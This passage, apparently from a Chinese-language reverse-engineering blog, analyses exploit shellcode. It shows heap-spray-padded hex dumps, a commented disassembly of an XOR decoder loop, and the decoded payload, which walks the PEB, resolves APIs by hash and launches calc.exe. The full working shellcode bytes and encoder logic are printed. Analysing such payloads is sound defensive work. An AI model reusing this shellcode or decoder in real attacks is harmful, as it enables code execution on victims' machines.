11 BB 22 D0 F6 B7 5E 59 F9 17  0`U???婿穅Y?</span></span><br><span class="line"><span class="comment">;....0090  D7 19 DE B3 BC FA 7F E5 18 AC 80 F5 C3 11 25 7D  ?蕹贱?瑎趺%&#125;</span></span><br><span class="line"><span class="comment">;....00A0  E9 46 54 DC 67 98 EA 5A C5 9A F4 64 79 F3 C5 EF  镕T躦橁Z艢鬱y笈</span></span><br><span class="line"><span class="comment">;....00B0  16 84 D9 25 53 7A 90 64 F5 13 7D FD 44 7E 7E 2B  勝%Sz恉?&#125;鼶~~+</span></span><br><span class="line"><span class="comment">;....00C0  8A 87 FD DE 72 7C 1D AB 77 38 99 47 05 51 4C 68  妵r|玾8橤QLh</span></span><br><span class="line"><span class="comment">;....00D0  BA 52 45 0B 5D C1 05 E2 F8 61 AF FA 0C 0C 0C 0C  篟E]?怿a....</span></span><br><span class="line"><span class="comment">;....00E0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"><span class="comment">;....00F0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 反汇编：</span></span><br><span class="line"><span class="comment">; 异或解密流程：以0x5E42A56D为基础异或key,异或待解密数据的第一个双字,将异或的结果与0x5E42A56D相加,得到下一个双字的异或key,以此类推,ecx=ecx-0x1,直至ecx=0,退出循环。</span></span><br><span class="line">....<span class="number">0000</span>    BA 6DA5425E     <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="number">0x5E42A56D</span>                 <span class="comment">; edx=0x5E42A56D,异或数</span></span><br><span class="line">....<span class="number">0005</span>    DDC4            <span class="keyword">ffree</span> <span class="built_in">st</span>(<span class="number">4</span>)                        <span class="comment">; </span></span><br><span class="line">....<span class="number">0007</span>    D97424 F4       <span class="keyword">fstenv</span> (<span class="number">28</span>-<span class="built_in">byte</span>) <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>-<span class="number">0xC</span>]  <span class="comment">; 保存FPU环境,0x0C0C0D3C-0x0C0C0D58</span></span><br><span class="line">....<span class="number">000B</span>    <span class="number">5D</span>              <span class="keyword">pop</span> <span class="built_in">ebp</span>                            <span class="comment">; ebp=0x....0005</span></span><br><span class="line">....000C    31C9            <span class="keyword">xor</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                        <span class="comment">; ecx=0x0</span></span><br><span class="line">....000E    B1 <span class="number">31</span>           <span class="keyword">mov</span> <span class="built_in">cl</span>,<span class="number">0x31</span>                        <span class="comment">; cl=0x31=49,异或数据(49个双字)</span></span><br><span class="line">....<span class="number">0010</span>    83C5 <span class="number">04</span>         <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x4</span>                        <span class="comment">; ebp=0x....0005+0x4=0x....0009</span></span><br><span class="line">....<span class="number">0013</span>    <span class="number">3155</span> 0F         <span class="keyword">xor</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xF</span>],<span class="built_in">edx</span>     <span class="comment">; [ebp+0xf]=[0x....0018]=0xA2B74762,异或解密0x18-0xDB的代码</span></span><br><span class="line">....<span class="number">0016</span>    <span class="number">0355</span> <span class="number">62</span>         <span class="keyword">add</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x62</span>]</span><br><span class="line">....<span class="number">0019</span>    <span class="number">47</span>              <span class="keyword">inc</span> <span class="built_in">edi</span></span><br><span class="line">....001A    B7 A2           <span class="keyword">mov</span> <span class="number">bh</span>,<span class="number">0xA2</span></span><br><span class="line">....001C    <span class="number">94</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">esp</span></span><br><span class="line">....<span class="number">001D</span>    <span class="number">05</span> 385B646A     <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0x6A645B38</span></span><br><span class="line">....<span class="number">0022</span>    B0 BE           <span class="keyword">mov</span> <span class="built_in">al</span>,<span class="number">0xBE</span></span><br><span class="line">....<span class="number">0024</span>    <span class="number">55</span>              <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">....<span class="number">0025</span>    AA              stos <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">....<span class="number">0026</span>    A6              cmps <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">....<span class="number">0027</span>    cb              <span class="keyword">retf</span></span><br><span class="line">....<span class="number">0028</span>    c51a            <span class="keyword">lds</span> <span class="built_in">ebx</span>,fword <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>]</span><br><span class="line">....002A    AC              lods <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</span><br><span class="line">....002B    9E              <span class="keyword">sahf</span></span><br><span class="line">....002C  - E9 D1E00A7A     <span class="keyword">jmp</span> 7E2BE102</span><br><span class="line">....<span class="number">0031</span>    <span class="number">97</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">edi</span></span><br><span class="line">....<span class="number">0032</span>    2C 3C           <span class="keyword">sub</span> <span class="built_in">al</span>,<span class="number">0x3C</span></span><br><span class="line">....<span class="number">0034</span>    cb              <span class="keyword">retf</span></span><br><span class="line">....<span class="number">0035</span>    120B            <span class="keyword">adc</span> <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>]</span><br><span class="line">....<span class="number">0037</span>  ^ <span class="number">73</span> CC           <span class="keyword">jnb</span> short ....<span class="number">0005</span></span><br><span class="line">....<span class="number">0039</span>    0F6F12          <span class="keyword">movq</span> <span class="built_in">mm2</span>,<span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>]</span><br><span class="line">....003C    4E              <span class="keyword">dec</span> <span class="built_in">esi</span></span><br><span class="line">....<span class="number">003D</span>    <span class="number">52</span>              <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line">....003E    BC F46F9DB1     <span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="number">0xB19D6FF4</span></span><br><span class="line">....<span class="number">0043</span>    F5              <span class="keyword">cmc</span></span><br><span class="line">....<span class="number">0044</span>    A8 C0           <span class="keyword">test</span> <span class="built_in">al</span>,<span class="number">0xC0</span></span><br><span class="line">....<span class="number">0046</span>    38A7 618EEF58   <span class="keyword">cmp</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>+<span class="number">0x58EF8E61</span>],<span class="number">ah</span></span><br><span class="line">....004C    <span class="number">06</span>              <span class="keyword">push</span> <span class="built_in">es</span></span><br><span class="line">....<span class="number">004D</span>    DA33            <span class="keyword">fidiv</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>]</span><br><span class="line">....004F    D254CA <span class="number">33</span>       <span class="keyword">rcl</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="built_in">ecx</span>*<span class="number">8</span>+<span class="number">0x33</span>],<span class="built_in">cl</span></span><br><span class="line">....<span class="number">0053</span>    <span class="number">07</span>              <span class="keyword">pop</span> <span class="built_in">es</span></span><br><span class="line">....<span class="number">0054</span>    2C ED           <span class="keyword">sub</span> <span class="built_in">al</span>,<span class="number">0xED</span></span><br><span class="line">....<span class="number">0056</span>    <span class="number">1296</span> 27B4B418   <span class="keyword">adc</span> <span class="built_in">dl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x18B4B427</span>]</span><br><span class="line">....005C    e4 cc           <span class="keyword">in</span> <span class="built_in">al</span>,<span class="number">0xcc</span></span><br><span class="line">....005E    FC              <span class="keyword">cld</span></span><br><span class="line">....005F    02E9            <span class="keyword">add</span> <span class="number">ch</span>,<span class="built_in">cl</span></span><br><span class="line">....<span class="number">0061</span>  - E9 B7B9D986     <span class="keyword">jmp</span> 8AFABA1D</span><br><span class="line">....<span class="number">0066</span>    <span class="number">49</span>              <span class="keyword">dec</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0067</span>    <span class="number">68</span> 1066E555     <span class="keyword">push</span> <span class="number">0x55E56610</span></span><br><span class="line">....006C    <span class="number">9D</span>              <span class="keyword">popfd</span></span><br><span class="line">....<span class="number">006D</span>    <span class="number">95</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span></span><br><span class="line">....006E    F792 194682EA   <span class="keyword">not</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>-<span class="number">0x157DB9E7</span>]</span><br><span class="line">....<span class="number">0074</span>    5A              <span class="keyword">pop</span> <span class="built_in">edx</span>                                </span><br><span class="line">....<span class="number">0075</span>    FB              <span class="keyword">sti</span></span><br><span class="line">....<span class="number">0076</span>    <span class="number">95</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span></span><br><span class="line">....<span class="number">0077</span>    <span class="number">2821</span>            <span class="keyword">sub</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>],<span class="number">ah</span></span><br><span class="line">....<span class="number">0079</span>    <span class="number">27</span>              <span class="keyword">daa</span></span><br><span class="line">....007A    13AB 81AC8317   <span class="keyword">adc</span> <span class="built_in">ebp</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="number">0x1783AC81</span>]</span><br><span class="line">....<span class="number">0080</span>    <span class="number">3060</span> <span class="number">55</span>         <span class="keyword">xor</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x55</span>],<span class="number">ah</span></span><br><span class="line">....<span class="number">0083</span>    D33E            <span class="keyword">sar</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="built_in">cl</span></span><br><span class="line">....<span class="number">0085</span>    CD <span class="number">11</span>           <span class="keyword">int</span> <span class="number">0x11</span></span><br><span class="line">....<span class="number">0087</span>    BB 22D0F6B7     <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="number">0xB7F6D022</span></span><br><span class="line">....008C    5E              <span class="keyword">pop</span> <span class="built_in">esi</span>                              </span><br><span class="line">....<span class="number">008D</span>    <span class="number">59</span>              <span class="keyword">pop</span> <span class="built_in">ecx</span>                             </span><br><span class="line">....008E    F9              <span class="keyword">stc</span></span><br><span class="line">....008F    <span class="number">17</span>              <span class="keyword">pop</span> <span class="built_in">ss</span></span><br><span class="line">....<span class="number">0090</span>    D7              <span class="keyword">xlat</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="built_in">al</span>]</span><br><span class="line">....<span class="number">0091</span>    19DE            <span class="keyword">sbb</span> <span class="built_in">esi</span>,<span class="built_in">ebx</span></span><br><span class="line">....<span class="number">0093</span>    B3 BC           <span class="keyword">mov</span> <span class="built_in">bl</span>,<span class="number">0xBC</span></span><br><span class="line">....<span class="number">0095</span>    FA              <span class="keyword">cli</span></span><br><span class="line">....<span class="number">0096</span>  ^ 7F E5           <span class="keyword">jg</span> short ....<span class="number">007D</span></span><br><span class="line">....<span class="number">0098</span>    18AC80 F5C31125 <span class="keyword">sbb</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="built_in">eax</span>*<span class="number">4</span>+<span class="number">0x2511C3F5</span>],c&gt;</span><br><span class="line">....009F  ^ <span class="number">7D</span> E9           <span class="keyword">jge</span> short ....008A</span><br><span class="line">....00A1    <span class="number">46</span>              <span class="keyword">inc</span> <span class="built_in">esi</span></span><br><span class="line">....00A2    <span class="number">54</span>              <span class="keyword">push</span> <span class="built_in">esp</span></span><br><span class="line">....00A3    DC67 <span class="number">98</span>         <span class="keyword">fsub</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>-<span class="number">0x68</span>]</span><br><span class="line">....00A6    ea 5ac59af4 <span class="number">647</span>&gt;<span class="keyword">jmp</span> <span class="built_in">far</span> <span class="number">7964</span>:0f49ac55a</span><br><span class="line">....00AD    f3              <span class="keyword">rep</span></span><br><span class="line">....00AE    c5              <span class="built_in">db</span> c5</span><br><span class="line">....00AF    ef              <span class="keyword">out</span> <span class="built_in">dx</span>,<span class="built_in">eax</span></span><br><span class="line">....00B0    <span class="number">16</span>              <span class="keyword">push</span> <span class="built_in">ss</span></span><br><span class="line">....00B1    84D9            <span class="keyword">test</span> <span class="built_in">cl</span>,<span class="built_in">bl</span></span><br><span class="line">....00B3    <span class="number">25</span> 537A9064     <span class="keyword">and</span> <span class="built_in">eax</span>,<span class="number">0x64907A53</span></span><br><span class="line">....00B8    F5              <span class="keyword">cmc</span></span><br><span class="line">....00B9    <span class="number">137D</span> FD         <span class="keyword">adc</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x3</span>]</span><br><span class="line">....00BC    <span class="number">44</span>              <span class="keyword">inc</span> <span class="built_in">esp</span></span><br><span class="line">....00BD    7E 7E           <span class="keyword">jle</span> short ....<span class="number">013D</span></span><br><span class="line">....00BF    2B8A 87FDDE72   <span class="keyword">sub</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x72DEFD87</span>]</span><br><span class="line">....00C5    7C <span class="number">1D</span>           <span class="keyword">jl</span> short ....00E4</span><br><span class="line">....00C7    AB              stos <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">....00C8    <span class="number">77</span> <span class="number">38</span>           <span class="keyword">ja</span> short ....<span class="number">0102</span></span><br><span class="line">....00CA    <span class="number">99</span>              <span class="keyword">cdq</span></span><br><span class="line">....00CB    <span class="number">47</span>              <span class="keyword">inc</span> <span class="built_in">edi</span></span><br><span class="line">....00CC    <span class="number">05</span> 514C68BA     <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0xBA684C51</span></span><br><span class="line">....00D1    <span class="number">52</span>              <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line">....00D2    <span class="number">45</span>              <span class="keyword">inc</span> <span class="built_in">ebp</span></span><br><span class="line">....00D3    0B5D C1         <span class="keyword">or</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x3F</span>]</span><br><span class="line">....00D6    <span class="number">05</span> E2F861AF     <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0xAF61F8E2</span></span><br><span class="line">....00<span class="built_in">DB</span>    FA              <span class="keyword">cli</span></span><br><span class="line">....00DC    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00DE    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E0    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E2    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E4    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E6    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br></pre></td></tr></table></figure></p>
<p><strong><code>解码后：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 内存：</span></span><br><span class="line"><span class="comment">;....0000  BA 6D A5 42 5E DD C4 D9 74 24 F4 5D 31 C9 B1 31  簃^菽賢$鬩1杀1</span></span><br><span class="line"><span class="comment">;....0010  83 C5 04 31 55 0F 03 55 0F E2 F5 FC E8 82 00 00  兣1UU怩?.</span></span><br><span class="line"><span class="comment">;....0020  00 60 89 E5 31 C0 64 8B 50 30 8B 52 0C 8B 52 14  .`夊1纃婸0婻.婻</span></span><br><span class="line"><span class="comment">;....0030  8B 72 28 0F B7 4A 26 31 FF AC 3C 61 7C 02 2C 20  媟(稪&amp;1?a|,</span></span><br><span class="line"><span class="comment">;....0040  C1 CF 0D 01 C7 E2 F2 52 57 8B 52 10 8B 4A 3C 8B  料.氢騌W婻婮&lt;</span></span><br><span class="line"><span class="comment">;....0050  4C 11 78 E3 48 01 D1 51 8B 59 20 01 D3 8B 49 18  Lx鉎裃媃 計I</span></span><br><span class="line"><span class="comment">;....0060  E3 3A 49 8B 34 8B 01 D6 31 FF AC C1 CF 0D 01 C7  ?I????</span></span><br><span class="line"><span class="comment">;....0070  38 E0 75 F6 03 7D F8 3B 7D 24 75 E4 58 8B 58 24  8鄒?&#125;?&#125;$u鋁媂$</span></span><br><span class="line"><span class="comment">;....0080  01 D3 66 8B 0C 4B 8B 58 1C 01 D3 8B 04 8B 01 D0  觙?K媂計?</span></span><br><span class="line"><span class="comment">;....0090  89 44 24 24 5B 5B 61 59 5A 51 FF E0 5F 5F 5A 8B  塂$$[[aYZQ郷_Z</span></span><br><span class="line"><span class="comment">;....00A0  12 EB 8D 5D 6A 01 8D 85 B2 00 00 00 50 68 31 8B  雿]j崊?..Ph1</span></span><br><span class="line"><span class="comment">;....00B0  6F 87 FF D5 BB F0 B5 A2 56 68 A6 95 BD 9D FF D5  o?栈鸬h綕</span></span><br><span class="line"><span class="comment">;....00C0  3C 06 7C 0A 80 FB E0 75 05 BB 47 13 72 6F 6A 00  &lt;|.€u籊roj.</span></span><br><span class="line"><span class="comment">;....00D0  53 FF D5 63 61 6C 63 2E 65 78 65 00 0C 0C 0C 0C  S誧alc.exe.....</span></span><br><span class="line"><span class="comment">;....00E0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"><span class="comment">;....00F0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 反汇编：</span></span><br><span class="line">....<span class="number">0000</span>    BA 6DA5425E     <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="number">0x5E42A56D</span>                          <span class="comment">; edx=0x5E42A56D,异或数</span></span><br><span class="line">....<span class="number">0005</span>    DDC4            <span class="keyword">ffree</span> <span class="built_in">st</span>(<span class="number">4</span>)                                 <span class="comment">;</span></span><br><span class="line">....<span class="number">0007</span>    D97424 F4       <span class="keyword">fstenv</span> (<span class="number">28</span>-<span class="built_in">byte</span>) <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>-<span class="number">0xC</span>]           <span class="comment">; 保存FPU环境,0x0C0C0D3C-0x0C0C0D58</span></span><br><span class="line">....<span class="number">000B</span>    <span class="number">5D</span>              <span class="keyword">pop</span> <span class="built_in">ebp</span>                                     <span class="comment">; ebp=0x....0005</span></span><br><span class="line">....000C    31C9            <span class="keyword">xor</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                 <span class="comment">; ecx=0x0</span></span><br><span class="line">....000E    B1 <span class="number">31</span>           <span class="keyword">mov</span> <span class="built_in">cl</span>,<span class="number">0x31</span>                                 <span class="comment">; cl=0x31=49,49个双字待异或解密数据</span></span><br><span class="line">....<span class="number">0010</span>    83C5 <span class="number">04</span>         <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x4</span>                                 <span class="comment">; ebp=0x....0005+0x4=0x....0009</span></span><br><span class="line">....<span class="number">0013</span>    <span class="number">3155</span> 0F         <span class="keyword">xor</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xF</span>],<span class="built_in">edx</span>              <span class="comment">; [ebp+0xf]=[0x....0018]=0xA2B74762,异或解密0x18-0xDB的代码</span></span><br><span class="line">....<span class="number">0016</span>    <span class="number">0355</span> 0F         <span class="keyword">add</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xF</span>]              <span class="comment">; edx=edx+[ebp+0xf]=0x5E42A56D+0xFCF5E20F=0x5B38877C</span></span><br><span class="line">....<span class="number">0019</span>  ^ E2 F5           loopd short ....<span class="number">0010</span>                        <span class="comment">; 跳转到0x....0010,ecx=ecx-1</span></span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">....<span class="number">001B</span>    FC              <span class="keyword">cld</span>                                         <span class="comment">; 方向标志位DF清零,lodsb指令根据DF改变esi</span></span><br><span class="line">....001C    E8 <span class="number">82000000</span>     <span class="keyword">call</span> ....00A3                               <span class="comment">; 返回地址为0x....0021</span></span><br><span class="line">....<span class="number">0021</span>    <span class="number">60</span>              <span class="keyword">pushad</span></span><br><span class="line">....<span class="number">0022</span>    89E5            <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">....<span class="number">0024</span>    31C0            <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line">....<span class="number">0026</span>    <span class="number">64</span>:8B50 <span class="number">30</span>      <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="built_in">eax</span>+<span class="number">0x30</span>]</span><br><span class="line">....002A    8B52 0C         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0xC</span>]</span><br><span class="line">....<span class="number">002D</span>    8B52 <span class="number">14</span>         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x14</span>]</span><br><span class="line">....<span class="number">0030</span>    8B72 <span class="number">28</span>         <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x28</span>]</span><br><span class="line">....<span class="number">0033</span>    0FB74A <span class="number">26</span>       <span class="keyword">movzx</span> <span class="built_in">ecx</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x26</span>]</span><br><span class="line">....<span class="number">0037</span>    31FF            <span class="keyword">xor</span> <span class="built_in">edi</span>,<span class="built_in">edi</span>                   ---+</span><br><span class="line">....<span class="number">0039</span>    AC              lods <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]           |</span><br><span class="line">....003A    3C <span class="number">61</span>           <span class="keyword">cmp</span> <span class="built_in">al</span>,<span class="number">0x61</span>                      |</span><br><span class="line">....003C    7C <span class="number">02</span>           <span class="keyword">jl</span> short ....<span class="number">0040</span>                | 计算dll名称hash</span><br><span class="line">....003E    2C <span class="number">20</span>           <span class="keyword">sub</span> <span class="built_in">al</span>,<span class="number">0x20</span>                      |</span><br><span class="line">....<span class="number">0040</span>    C1CF <span class="number">0D</span>         <span class="keyword">ror</span> <span class="built_in">edi</span>,<span class="number">0xD</span>                      |</span><br><span class="line">....<span class="number">0043</span>    01C7            <span class="keyword">add</span> <span class="built_in">edi</span>,<span class="built_in">eax</span>                      |</span><br><span class="line">....<span class="number">0045</span>  ^ E2 F2           loopd short ....<span class="number">0039</span>          ---+</span><br><span class="line">....<span class="number">0047</span>    <span class="number">52</span>              <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line">....<span class="number">0048</span>    <span class="number">57</span>              <span class="keyword">push</span> <span class="built_in">edi</span></span><br><span class="line">....<span class="number">0049</span>    8B52 <span class="number">10</span>         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x10</span>]</span><br><span class="line">....004C    8B4A 3C         <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x3C</span>]</span><br><span class="line">....004F    8B4C11 <span class="number">78</span>       <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="built_in">edx</span>+<span class="number">0x78</span>]</span><br><span class="line">....<span class="number">0053</span>    E3 <span class="number">48</span>           <span class="keyword">jecxz</span> short ....<span class="number">009D</span></span><br><span class="line">....<span class="number">0055</span>    01D1            <span class="keyword">add</span> <span class="built_in">ecx</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0057</span>    <span class="number">51</span>              <span class="keyword">push</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0058</span>    8B59 <span class="number">20</span>         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x20</span>]</span><br><span class="line">....005B    01D3            <span class="keyword">add</span> <span class="built_in">ebx</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">005D</span>    8B49 <span class="number">18</span>         <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x18</span>]</span><br><span class="line">....<span class="number">0060</span>    E3 3A           <span class="keyword">jecxz</span> short ....009C</span><br><span class="line">....<span class="number">0062</span>    <span class="number">49</span>              <span class="keyword">dec</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0063</span>    8B348B          <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="built_in">ecx</span>*<span class="number">4</span>]</span><br><span class="line">....<span class="number">0066</span>  